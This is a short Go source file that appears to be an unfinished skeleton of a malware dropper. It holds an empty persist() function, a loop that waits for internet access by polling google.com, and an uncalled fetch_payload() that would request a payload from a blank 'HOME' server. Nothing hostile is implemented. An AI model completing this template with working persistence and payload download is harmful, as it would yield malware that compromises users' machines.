package main

import (
	"fmt"
	"net/http"
	"time"
)

const (
	HOME = ""
)

func main() {
	fmt.Println("Hello friend")
	persist()
	for !has_internet_access() {
		time.Sleep(time.Minute)
	}
}

func persist() {

}

func has_internet_access() bool {
	_, err := http.Get("https://www.google.com")
	return err == nil
}

func fetch_payload() string {
	resp, _ := http.Get(HOME)
	fmt.Println(resp)
	return ""
}